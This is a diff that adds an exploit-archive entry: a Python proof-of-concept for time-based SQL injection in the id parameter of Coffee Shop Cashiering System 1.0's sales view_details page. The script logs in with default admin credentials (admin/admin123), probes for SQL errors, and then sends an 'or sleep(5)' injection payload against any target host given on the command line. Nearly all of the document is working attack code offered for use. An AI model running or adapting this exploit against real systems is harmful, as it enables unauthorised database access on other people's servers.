@@ -1,0 +1,71 @@
+id: 37815
+date: 06/27/2022
+title: Coffee Shop Cashiering System 1.0 SQL Injection Exploit
+author: syad
+cves: 
+
+# Exploit Title: Coffee Shop Cashiering System - Authenticated Time Based Sql injection
+# Exploit Author: syad
+# Vendor Homepage: https://www.sourcecodester.com
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/cscs.zip
+# Version: 1.0
+# Tested on: Windows 10 + XAMPP 3.2.4
+# CVE ID : N/A
+
+# Description 
+# The id parameter does not perform input validation on the view_detail.php file it allow authenticated Time Based SQL Injection.
+
+
+import requests
+import sys
+s = requests.session()
+
+proxies = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}
+
+
+def login_sql():
+    target = "http://%s/cscs/classes/Login.php?f=login" % sys.argv[1]
+    d = {
+        "username" : "admin",
+        "password" : "admin123"
+    }
+    r = s.post(target, data=d, allow_redirects=True, proxies=proxies)
+    res = r.text
+    if "success" in res:
+        return True
+    else:
+        return False
+
+
+def detect_sql():
+    r = s.get("http://%s/cscs/admin/?page=sales/view_details&id=2'" % sys.argv[1])
+    res = r.text
+    if "You have an error in your SQL syntax;" in res:
+        print("[+] SQL Error Found !!")
+    else:
+        return False
+
+def time_based_sql():
+    target = "http://%s/cscs/admin/?page=sales/view_details&id=2'+or+sleep(5)--+-" % sys.argv[1]
+    r = s.get(target, proxies=proxies)
+    print("[+] Time Based SQL Injection Executed !!!")
+
+
+
+
+def main():
+    if len(sys.argv) !=2:
+        print("(+) usage: %s <target>" % sys.argv[0] )
+        print("(+) eg: %s 192.168.121.103 " % sys.argv[0] )
+        sys.exit(-1)
+
+    if login_sql():
+        print("[+] Success Login")
+
+    detect_sql()
+    time_based_sql()
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2023-03-23]  #
